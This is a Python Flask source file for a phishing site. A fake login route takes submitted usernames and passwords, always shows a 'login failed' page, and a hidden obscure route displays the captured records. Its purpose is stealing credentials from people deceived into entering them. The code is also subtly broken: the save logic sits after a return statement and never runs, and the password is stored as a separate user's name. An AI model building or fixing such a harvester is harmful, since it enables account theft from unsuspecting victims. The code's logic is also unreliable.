from unicodedata import name
from flask import Flask, redirect, url_for, render_template, request, session, flash
from flask_sqlalchemy import SQLAlchemy
from datetime import timedelta

app = Flask(__name__)
app.permanent_session_lifetime = timedelta(minutes=5)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.sqlite3'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

class users(db.Model):
    _id = db.Column('id', db.Integer, primary_key=True)
    username = db.Column(db.String(100))
    password = db.Column(db.String(100))

    def __init__(self, username, password):
        self.username = username
        self.password = password

# all pages

# home page
@app.route('/')
def home():
    return render_template('index.html')

# login page
@app.route('/login/', methods=['POST', 'GET'])
def fake_login():
    if request.method == 'POST':
        user = request.form["nm"]
        pwrd = request.form['pw']
        return redirect('/login/retry/')
        session["login"] = "login"

        usr = users(user, "")
        pwd = users(pwrd, "")
        db.session.add(usr)
        db.session.add(pwd)
        db.session.commit()
    else:
        return render_template('loginpage.html')

# view logged details
@app.route('/ihjioahsnh8h8h28bstgc/')
def view_logged_users():
    return render_template('view.html', values=users.query.all())

# login 'failed' page
@app.route('/login/retry/')
def fake_logged_in():
    return render_template('loginfailed.html')
    session.pop("login", None)



if __name__ == '__main__':
    db.create_all()
    app.run(debug=True)